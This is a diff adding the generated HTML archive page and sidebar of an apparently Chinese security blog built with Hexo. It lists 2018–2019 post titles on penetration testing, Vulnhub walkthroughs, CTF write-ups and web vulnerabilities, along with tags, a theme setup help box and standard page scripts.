+            <span class="archive-post-date">05/10</span><a class="archive-post-title" href= "/2019/05/10/cs2msf/" >CS shell 与 Msf session 转换</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span><a class="archive-post-title" href= "/2019/04/29/lPentest-domain/" >内网渗透--横向移动(委派与中继)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href= "/2019/04/23/IPentest-domain4/" >内网渗透--横向移动(SPN攻击)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href= "/2019/04/19/lPentest-domain2/" >内网渗透--票据传递</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/12</span><a class="archive-post-title" href= "/2019/04/12/IPentest-domain3/" >内网渗透--Hash传递攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2019/04/09/IPentest-admin/" >内网渗透--本机提权</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/31</span><a class="archive-post-title" href= "/2019/03/31/IPentest-tunnel/" >内网渗透--通信隧道</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href= "/2019/03/27/IPentest-discover/" >内网渗透--内网探测</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/2019/03/24/IPentest-base/" >内网渗透--基础</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2019/03/21/tp/" >Thinkphp5 RCE漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/20</span><a class="archive-post-title" href= "/2019/02/20/cors/" >CORS & Jsonp Hijacking</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/15</span><a class="archive-post-title" href= "/2019/02/15/freshly/" >Vunlhub之freshly</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/02</span><a class="archive-post-title" href= "/2019/02/02/redis/" >浅谈Redis未授权攻击方式</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span><a class="archive-post-title" href= "/2019/01/23/leaks/" >Vulnhub之FristiLeaks</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span><a class="archive-post-title" href= "/2019/01/15/box/" >Vulnhub之Billu_b0x</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/10</span><a class="archive-post-title" href= "/2019/01/10/born2boot/" >Vulnhub之born2boot</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/04</span><a class="archive-post-title" href= "/2019/01/04/Lazysysadmin/" >Vulnhub之Lazysysadmin</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/2018/12/24/cryptology/" >分组密码工作模式</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/18</span><a class="archive-post-title" href= "/2018/12/18/Wakanda/" >Vulnhub之Wakanda</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/2018/12/14/bulldog/" >Vulnhub之bulldog</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2018/12/07/YFCTF/" >YFCTF协议分析WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/03</span><a class="archive-post-title" href= "/2018/12/03/sqlilab/" >sqli-lab(54-65)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href= "/2018/12/02/sqlila/" >sqli-lab(38-53)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href= "/2018/12/01/sqlil/" >sqli-lab(23-37)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/30</span><a class="archive-post-title" href= "/2018/11/30/sqli/" >sqli-lab(1-22)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href= "/2018/11/28/Git-study/" >Git-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2018/11/26/NCTF/" >NCTF-2018 WriteUp web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/20</span><a class="archive-post-title" href= "/2018/11/20/xxe-study/" >XXE Study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/17</span><a class="archive-post-title" href= "/2018/11/17/cg-ctf/" >CG-CTF WriteUp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "/2018/11/15/ssrf-study/" >SSRF Study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href= "/2018/11/14/bar-ctf/" >实验吧CTF---WriteUp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/03</span><a class="archive-post-title" href= "/2018/11/03/deserialize/" >Java反序列化漏洞实践利用学习-(2)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/30</span><a class="archive-post-title" href= "/2018/10/30/web/" >记Weblogic反序列化的一次学习-(1)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span><a class="archive-post-title" href= "/2018/10/27/Yoga/" >Hexo入坑记</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Git"><span class="iconfont-archer">&#xe606;</span>Git</span>
+    
+        <span class="sidebar-tag-name" data-tags="内网渗透"><span class="iconfont-archer">&#xe606;</span>内网渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="vulnhub"><span class="iconfont-archer">&#xe606;</span>vulnhub</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="blog"><span class="iconfont-archer">&#xe606;</span>blog</span>
+    
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
+        <span class="sidebar-tag-name" data-tags="java"><span class="iconfont-archer">&#xe606;</span>java</span>
+    
+        <span class="sidebar-tag-name" data-tags="deserialize"><span class="iconfont-archer">&#xe606;</span>deserialize</span>
+    
+        <span class="sidebar-tag-name" data-tags="CORS"><span class="iconfont-archer">&#xe606;</span>CORS</span>
+    
+        <span class="sidebar-tag-name" data-tags="JSONP"><span class="iconfont-archer">&#xe606;</span>JSONP</span>
+    
+        <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="unserializable"><span class="iconfont-archer">&#xe606;</span>unserializable</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
+    
+        <span class="sidebar-tag-name" data-tags="未授权"><span class="iconfont-archer">&#xe606;</span>未授权</span>
+    
+        <span class="sidebar-tag-name" data-tags="RFI"><span class="iconfont-archer">&#xe606;</span>RFI</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="sql注入"><span class="iconfont-archer">&#xe606;</span>sql注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
+        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="unserialize"><span class="iconfont-archer">&#xe606;</span>unserialize</span>
+    
+        <span class="sidebar-tag-name" data-tags="weblogic"><span class="iconfont-archer">&#xe606;</span>weblogic</span>
+    
+        <span class="sidebar-tag-name" data-tags="xxe"><span class="iconfont-archer">&#xe606;</span>xxe</span>
+    
+        <span class="sidebar-tag-name" data-tags="cryptology"><span class="iconfont-archer">&#xe606;</span>cryptology</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Yoga7xm"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
